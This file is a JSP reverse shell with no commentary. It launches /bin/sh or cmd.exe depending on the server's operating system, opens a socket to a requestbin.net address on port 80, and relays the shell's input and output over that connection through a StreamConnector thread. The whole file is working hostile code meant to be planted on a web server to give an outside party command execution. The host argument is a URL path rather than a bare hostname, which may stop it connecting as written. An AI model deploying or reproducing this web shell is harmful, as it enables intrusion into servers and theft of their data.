<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream zo;
    OutputStream ba;

    StreamConnector( InputStream zo, OutputStream ba )
    {
      this.zo = zo;
      this.ba = ba;
    }

    public void run()
    {
      BufferedReader hj  = null;
      BufferedWriter mbu = null;
      try
      {
        hj  = new BufferedReader( new InputStreamReader( this.zo ) );
        mbu = new BufferedWriter( new OutputStreamWriter( this.ba ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = hj.read( buffer, 0, buffer.length ) ) > 0 )
        {
          mbu.write( buffer, 0, length );
          mbu.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( hj != null )
          hj.close();
        if( mbu != null )
          mbu.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "requestbin.net/r/5jjzfm8w", 80 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
